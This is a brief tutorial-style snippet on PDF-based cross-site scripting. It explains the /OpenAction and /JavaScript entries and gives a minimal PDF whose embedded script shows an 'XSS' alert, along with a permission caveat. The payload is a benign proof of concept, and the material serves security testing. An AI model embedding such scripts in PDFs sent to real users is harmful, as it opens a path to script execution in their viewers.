PDF Bypass ‚ö†Ô∏è | Cross-Site Scripting | Microsoft 

To bypass PDF-based Cross-Site Scripting (XSS) protection, you can embed malicious scripts in JavaScript actions within the PDF. These scripts can execute when the PDF is opened in a vulnerable viewer. For instance, you can use the `/JavaScript` entry in the PDF's catalog or the `OpenAction` attribute to trigger the script. Always ensure you have permission to test any systems or documents for vulnerabilities.

Here‚Äôs a basic example of how to embed JavaScript in a PDF to attempt a bypass:

 ```pdf
 %PDF-1.4
 1 0 obj
 <<
 /Type /Catalog
 /OpenAction 2 0 R
 >>
 endobj
 2 0 obj
 <<
 /S /JavaScript
 /JS (app.alert('XSS');)
 >>
 endobj
 trailer
 <<
 /Root 1 0 R
 >>
 %%EOF
 ```

 This PDF will execute the JavaScript `app.alert('XSS');` when opened, displaying an alert with the message "XSS". Note that modern PDF viewers often have mitigations for such attacks.
